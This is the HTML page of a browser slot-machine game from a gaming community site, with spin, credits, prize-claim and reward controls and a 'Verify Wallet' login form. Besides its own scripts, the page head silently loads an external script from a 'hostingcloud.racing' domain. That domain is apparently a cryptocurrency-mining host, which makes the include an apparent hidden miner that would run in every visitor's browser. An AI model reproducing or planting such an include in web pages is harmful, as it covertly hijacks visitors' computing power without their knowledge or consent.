<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link rel="stylesheet" href="/games/slots/style.css" />
    <link rel="stylesheet" href="/style.css" />

    <script src="/games/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <script src="/games/slots/slots.js" defer></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
  </head>
  <body>
    <!-- Slots -->
    <center>
      <div class="slots">
        <div class="slot">
          <div class="ticker">
              <label id="timeM" value="0">00</label>.<label id="timeS" value="0"
          >00</label
        >
          </div>
          <label id="spinOne" title="spinOne" class=""></label
          ><label id="spinTwo" title="spinTwo" class=""></label
          ><label id="spinThree" title="spinThree" class=""></label>

          <div id="spinMe" class="button" onclick="spin();">Spin</div>
        </div>

        <br />
        <div id="features" class="features">
          <div class="credits">
            Credits:
            <label id="credits">3</label>
            <meter
              class="hide"
              id="CREDITS"
              min="0"
              low="40"
              high="90"
              max="10"
              value="1"
            ></meter>

            <div class="button" onclick="loadRewards();">Load Rewards</div>
            <br />
            Prize:
            <label id="prize">0</label>
            <meter
              class="hide"
              id="PRIZE"
              min="0"
              low="40"
              high="90"
              max="10"
              value="1"
            ></meter>
          </div>
          <div class="button-right" onclick="claimPrize();">Claim Prize</div>
        </div>
      </div>
    </center>
   <div id="getLogin"  class="hide">
          <div class="loginImage">
            <br />
            <br />
            <form class="form" id="wallet">
              <input
                name="dream"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Verify Wallet"
                required
              />
              <br />
              <button type="submit" id="submit-dream">Login</button>
            </form>
            <br />
          </div>
        </div>
    
    <div class="hide" id="rewardicon" onclick="claimUpdate();">
      <br />
      <br />
      <center>
        <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
          >00</label
        >
      </center>
    </div>
    <div class="hide" id="profileicon" onclick="viewReward();"></div>
    <div title="closed" id="REWARDS" class="hide">
      <div onclick="viewReward();" style="cursor: pointer; margin-left: 90%">
        X
      </div>
      <div id="help" class="helpIcon" title="Help" onclick="help();">
        <br /><label class="version" id="version"></label>
        <meter
          class="hide"
          id="levelUp"
          min="0"
          low="40"
          high="90"
          max="100"
          value="0"
        ></meter>
      </div>
      <div class="hide">Player: <label id="myName">Guest</label></div>
      <div>
        Wallet:
        <label id="myWallet" onclick="getLogin();" style="cursor: pointer"
          >LOGIN</label
        >
      </div>
      <div>
        Reward Token:
        <label id="myToken" onclick="changeToken();">Random</label>
      </div>
      <div>
        Mode:<br />
        <label id="vrMode" class="downarrowG" title="Hubs" onclick="vrMode();"
          >Hubs</label
        ><br />
        <label
          id="classicMode"
          class="downarrow"
          title="Classic"
          onclick="classicMode();"
          >Classic</label
        ><br />
        <label
          id="liveMode"
          class="downarrow"
          title="Live"
          onclick="liveMode();"
          >Live</label
        >
      </div>
      <br />
      <div class="button" onclick="pendingClaims();">View Pending</div>
      <button class="hide" id="clear-dreams">Clear Dreams</button>
      <section title="closed" id="pendingClaims" class="hide">
        <ul id="dreams"></ul>
      </section>
    </div>
  </body>
</html>
